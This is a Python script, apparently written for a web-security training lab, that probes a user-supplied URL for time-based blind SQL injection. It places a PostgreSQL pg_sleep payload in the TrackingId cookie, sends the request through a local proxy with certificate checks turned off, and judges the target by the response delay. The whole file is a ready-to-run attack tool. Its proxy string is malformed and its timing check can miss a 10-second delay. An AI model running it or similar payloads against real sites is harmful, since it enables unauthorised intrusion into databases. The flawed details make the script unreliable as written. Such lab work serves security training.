# Import necessary modules
import sys
import requests
import urllib3
import urllib

# Disable warnings about insecure requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Define proxy settings
proxies = {'http': 'http:127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Function to check for blind-based SQL injection vulnerability
def blind_sqli_check(url):
    # Construct a SQL injection payload that causes a delay of 10 seconds (pg_sleep)
    sqli_payload = "' || (SELECT pg_sleep(10))--"
    # URL encode the SQL injection payload
    sqli_payload_encoded = urllib.parse.quote(sqli_payload)
    # Set cookies for the request with the SQL injection payload
    cookies = {'TrackingId': 'Vp8A7FRvF3EoJ8d6' + sqli_payload_encoded, 'session': '4f2ZQLyLfM1a7kp8JqA0HamWunmoeRwe'}
    # Send the GET request with cookies, ignoring SSL verification, and using proxies
    r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
    
    # Check if the response time is greater than 10 seconds
    if int(r.elapsed.total_seconds()) > 10:
        print("(+) Vulnerable to time-based blind SQL injection")
    else:
        print("(-) Not vulnerable to time-based blind SQL injection")

# Main function to execute the blind-based SQL injection check
def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    url = sys.argv[1]  # Get the target URL from command-line argument
    print("(+) Checking if tracking cookie is vulnerable to time-based blind SQL injection....")
    blind_sqli_check(url)  # Call the blind-based SQL injection check function

# Entry point of the script
if __name__ == "__main__":
    main()  # Call the main function to start the vulnerability check
